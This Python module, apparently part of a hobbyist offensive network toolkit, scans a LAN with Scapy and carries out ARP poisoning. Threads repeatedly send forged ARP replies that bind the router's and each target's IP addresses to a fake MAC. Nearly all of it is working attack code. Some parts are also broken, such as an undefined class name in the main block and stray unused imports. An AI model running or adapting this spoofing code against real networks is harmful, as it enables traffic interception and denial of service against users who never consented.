# THIS MODULE WILL HOLD LAYER 2/3 ATTACKS, ORIGINALLY PERTAINING TO ARP


# UI IMPORTS
from ast import While
from platform import libc_ver
from socket import if_nameindex
from turtle import st

from rich.panel import Panel
from rich.table import Table
from rich.live import Live
import pyfiglet


# NETWORK IMPORTS
from scapy.all import Ether, ARP, srp, sendp, get_if_list, get_if_addr


# ETC IMPORTS
import threading, time, ipaddress, os, argparse, sys


# NSM IMPORTS
from nsm_vars import Variables
from nsm_database import DataBase



# CONSTANTS
console = Variables.console



class ARP_Controller():
    """This class will pertain to anything ARP related"""


    attack     = False
    router_ip  = False
    router_mac = False
    fake_mac   = False

    total_sent = 0

    LOCK = threading.RLock()



    # DEAPPRECIATED // THIS WAS SUPPOSE TO ENABLE AUTOMATIC IFACE BUT NAHHH, LET THE USER STRUGGLE AND LEARN // LOLOLOLOL
    @classmethod
    def get_ifaces(cls):
        """This method will be responsible for displaying availables ifaces"""


        ip_local = Variables.ip_local


        target = ipaddress.ip_address(ip_local)
        console.print(get_if_list())
        console.print(target)

        for name in get_if_list():

            if name.startswith(("lo", "utun", "awdl", "llw")): continue


            try: addr = get_if_addr(name)
            except Exception: continue

            if not addr or addr == "0.0.0.0": continue

            #try:
            #except ValueError





            console.print(addr)



    @classmethod
    def _resolve_mac(cls, ip, iface=False, verbose=False):
        """This method will be responsible for resolving mac addresses"""


        if not iface: iface = Variables.iface

        frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip) 
        response, _ = srp(frame, iface=iface, timeout=2, retry=1, verbose=verbose)

        for sent, recv in response:
            ipp  = recv.psrc
            mac = recv.hwsrc.strip()

            console.print(f"\n[yellow][!] Map:[/yellow] {ip} <--> {mac}\n")
            
            return mac



    @classmethod
    def _scan(cls, skip=False, verbose=False):
        """This method will be responsible for discovering LAN devices via ARP"""


        c1 = "bold red"
        c2 = "bold yellow"



        table = Table(title="ARP Devices", style="bold red", border_style="bold purple", title_style="red")
        table.add_column("IP", style="yellow")
        table.add_column("MAC", style="green")
        table.add_column("vendor", style="bold blue")
        
        devices = []


        iface = Variables.iface
        timeout = Variables.timeout


        subnet = Variables.ip_subnet; valid_subnet = ipaddress.ip_network(subnet)
        frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(valid_subnet))

        if not skip: 


            console.print(f"[{c2}]=====  CONSTANTS  =====")
            console.print(f"[{c2}][+] Iface:[{c1}] {Variables.iface}"
                          f"\n[{c2}][+] Subnet:[{c1}] {Variables.ip_subnet}"                  
                          f"\n[{c2}][+] Router_IP:[{c1}] {Variables.ip_router}"
                          f"\n[{c2}][+] Router_MAC:[{c1}] {Variables.mac_router}"
                          f"\n[{c2}][+] Fake_MAC:[{c1}] {Variables.mac_fake}"
                          f"\n[{c2}][+] Delay:[{c1}] {Variables.delay}"
                          f"\n[{c2}]======================="
                          )
        
            
            console.print(f"\n[bold green][+] Performing ARP Scan!")

        response, _ = srp(frame, iface=iface, verbose=verbose, timeout=timeout)

        with Live(table, console=console, refresh_per_second=4):

            for sent, recv in response:

                ip     = recv.psrc
                mac    = recv.hwsrc.strip()
                vendor = DataBase.WiFi.get_vendor_main(mac=mac)

                devices.append((ip, mac, vendor))

                table.add_row(f"{ip}", f"{mac}", f"{vendor}")
                #console.print((ip, mac, vendor))


        console.print(f"\n[bold green][+] Devices Found:[/bold green] {len(devices)}")

        return devices



    @classmethod
    def _arp_poison(cls):
        """This method will allow the user to perform an ARP poison attack"""


        c1 = "bold red"
        c2 = "bold yellow"


        devices = []; cls.attack = True

        panel = Panel(renderable="Developed by NSM Barii", style="bold red", border_style="bold purple", expand=False)


        console.print(f"[{c2}]=====  CONSTANTS  =====")
        console.print(f"[{c2}][+] Iface:[{c1}] {Variables.iface}"
                        f"\n[{c2}][+] Subnet:[{c1}] {Variables.ip_subnet}"                  
                        f"\n[{c2}][+] Router_IP:[{c1}] {Variables.ip_router}"
                        f"\n[{c2}][+] Router_MAC:[{c1}] {Variables.mac_router}"
                        f"\n[{c2}][+] Fake_MAC:[{c1}] {cls.fake_mac}"
                        f"\n[{c2}][+] Delay:[{c1}] {Variables.delay}"
                        f"\n[{c2}]======================="
                        )


        console.print(f"\n[bold green][+] Performing ARP Poison")
        if Variables.mac: 
            for m in Variables.mac.split(","): devices.append(m)

            console.print(m)
        
        else: devices = cls._scan(skip=True)   
        
        console.print(f"\n[bold red]Poison list:[yellow] {devices}")


        with Live(panel, console=console, refresh_per_second=4):
            for device in devices:

                ip  = device[0]
                mac = device[1]
                vendor = device[2]


                threading.Thread(target=cls._attack, args=(ip, mac, vendor), daemon=True).start()


            
            try:

                while True:

                    panel.renderable = f"Total Frames sent: [{c2}]{cls.total_sent}[/{c2}] - Poisoned Devices: [{c2}]{len(devices)}[/{c2}] - Router_IP: [{c2}]{cls.router_ip}:{cls.router_mac}[/{c2}] - Fake_MAC: [{c2}]{cls.fake_mac}[/{c2}] - Subnet: [{c2}]{Variables.ip_subnet}[/{c2}]"
                    time.sleep(2)

            except KeyboardInterrupt as e: console.print(f"[bold red][!] Operation Interrupted")
            except Exception as e: console.print(f"[bold red][!] Exception Error:[yellow] {e}")

            finally:

                panel.renderable = f"[bold red][!] Attack STOPPED!"
                cls.attack = False
                sys.exit()



    @classmethod
    def _attack(cls, target_ip, target_mac, vendor=False, verbose=False):
        """This method will be called upon by cls._arp_poison <-- to attack a single target that will be threaded"""


        iface = Variables.iface

        router_ip  = str(cls.router_ip)
        router_mac = str(cls.router_mac)
        fake_mac   = str(cls.fake_mac)

        frame_for_target = Ether(src=fake_mac, dst=target_mac) / ARP(psrc=router_ip, pdst=target_ip, hwsrc=fake_mac, hwdst=target_mac, op=2)
        frame_for_router = Ether(src=target_mac, dst=router_mac) / ARP(psrc=target_ip, pdst=router_ip, hwsrc=fake_mac, hwdst=router_mac, op=2)


        console.print(f"[bold red][!] Poisoning -->[yellow] {target_ip}:{target_mac} - {vendor}")


        while cls.attack:

            sendp(frame_for_router, iface=iface, verbose=verbose)
            sendp(frame_for_target, iface=iface, verbose=verbose)

            console.print(f"[+][green] sent -->[/green] {frame_for_target} <> {frame_for_router}")

            with cls.LOCK: cls.total_sent += 2

            time.sleep(Variables.delay)




    @classmethod
    def main(cls):
        """This method will be responsible for controlling the module"""


        if not Variables.iface:     console.print(f"[bold red][!] iface needed and not given by user!"); return False
        if not Variables.ip_subnet: console.print(f"[bold red][!] subnet needed and not given by user!"); return False
        
        if Variables.arp_scan:     cls._scan(); return True
        
        cls.router_ip = Variables.ip_router
        if not Variables.mac_router: cls.router_mac = cls._resolve_mac(ip=cls.router_ip); Variables.mac_router = cls.router_mac
        if not Variables.ip_router: console.print(f"[bold red][!] routers IP needed and not given by user!"); return False
        if not Variables.mac_fake:  console.print(f"[bold red][!] fake mac address needed and not given by user!"); return False

        cls.fake_mac = Variables.mac_fake

        

        if Variables.arp_poison: cls._arp_poison(); return True






if __name__ == "__main__":

    Variables.ip_local = "192.168.1.100"
    Variables.ip_subnet = "192.168.1.0/24"
    Variables.iface = "en0"

    Variables.mac = "aa:bb:cc:dd:ee:01, aa:bb:cc:dd:ee:02, aa:bb:cc:dd:ee:03"
    ARP_.get_ifaces()


    ARP_._arp_poison()